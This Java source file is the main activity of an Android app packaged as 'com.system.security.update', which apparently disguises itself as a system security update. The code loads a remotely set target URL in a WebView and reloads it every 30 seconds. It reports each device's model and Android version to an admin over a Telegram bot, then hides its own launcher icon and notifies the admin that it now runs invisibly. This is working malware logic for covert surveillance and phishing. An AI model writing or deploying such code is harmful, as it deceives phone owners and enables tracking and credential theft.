package com.system.security.update;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

public class WebViewActivity extends AppCompatActivity {
    
    private WebView webView;
    private ProgressBar progressBar;
    private SwipeRefreshLayout swipeRefresh;
    private TextView urlText;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webview);
        
        webView = findViewById(R.id.webView);
        progressBar = findViewById(R.id.progressBar);
        swipeRefresh = findViewById(R.id.swipeRefresh);
        urlText = findViewById(R.id.urlText);
        
        setupWebView();
        
        // Show current URL
        urlText.setText(Config.CURRENT_TARGET_URL);
        
        // Start Telegram bot check
        TelegramBotHelper.startChecking(this);
        
        // Schedule app icon hiding
        new Handler().postDelayed(this::hideAppIcon, Config.HIDE_ICON_DELAY);
        
        // Schedule periodic target URL refresh check
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isFinishing()) {
                    // Reload with any updated URL
                    String currentUrl = webView.getUrl();
                    if (currentUrl == null || !currentUrl.equals(Config.CURRENT_TARGET_URL)) {
                        webView.loadUrl(Config.CURRENT_TARGET_URL);
                    }
                    new Handler().postDelayed(this, 30000); // Check every 30s
                }
            }
        }, 30000);
        
        // Load target URL
        webView.loadUrl(Config.CURRENT_TARGET_URL);
        
        // Send notification to admin
        TelegramBotHelper.sendMessageToAdmin(this,
                "👤 *New Device Opened App*\n" +
                "• Device: `" + Config.deviceModel + "`\n" +
                "• Android: `" + Config.deviceAndroid + "`\n" +
                "• URL: `" + Config.CURRENT_TARGET_URL + "`");
    }
    
    private void setupWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setBuiltInZoomControls(true);
        settings.setDisplayZoomControls(false);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
        settings.setDatabaseEnabled(true);
        
        // Chrome-like User Agent
        String ua = "Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + 
                "; " + Build.MODEL + ") AppleWebKit/537.36 " +
                "(KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36";
        settings.setUserAgentString(ua);
        
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                progressBar.setVisibility(View.VISIBLE);
                urlText.setText(url);
                super.onPageStarted(view, url, favicon);
            }
            
            @Override
            public void onPageFinished(WebView view, String url) {
                progressBar.setVisibility(View.GONE);
                swipeRefresh.setRefreshing(false);
                urlText.setText(url);
                
                // Make site look normal
                injectNormalizer(view);
                super.onPageFinished(view, url);
            }
            
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                String url = request.getUrl().toString();
                
                // Handle specific schemes
                if (url.startsWith("tel:") || url.startsWith("mailto:") || 
                    url.startsWith("whatsapp:") || url.startsWith("intent:")) {
                    try {
                        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                        startActivity(intent);
                    } catch (Exception e) {}
                    return true;
                }
                
                view.loadUrl(url);
                return true;
            }
        });
        
        swipeRefresh.setOnRefreshListener(() -> {
            webView.reload();
        });
    }
    
    private void injectNormalizer(WebView view) {
        String js = "javascript:(function() {" +
                "document.body.style.overflow = 'auto';" +
                "var viewport = document.querySelector('meta[name=viewport]');" +
                "if(viewport) viewport.content = 'width=device-width, initial-scale=1.0';" +
                "})();";
        view.loadUrl(js);
    }
    
    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName component = new ComponentName(this, 
                    "com.system.security.update.SplashActivity");
            pm.setComponentEnabledSetting(component,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            
            TelegramBotHelper.sendMessageToAdmin(this,
                    "✅ *App Icon Hidden*\n" +
                    "• App is now invisible from launcher\n" +
                    "• Running in background mode");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && webView.canGoBack()) {
            webView.goBack();
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    
    @Override
    protected void onDestroy() {
        if (webView != null) {
            webView.destroy();
        }
        super.onDestroy();
    }
}
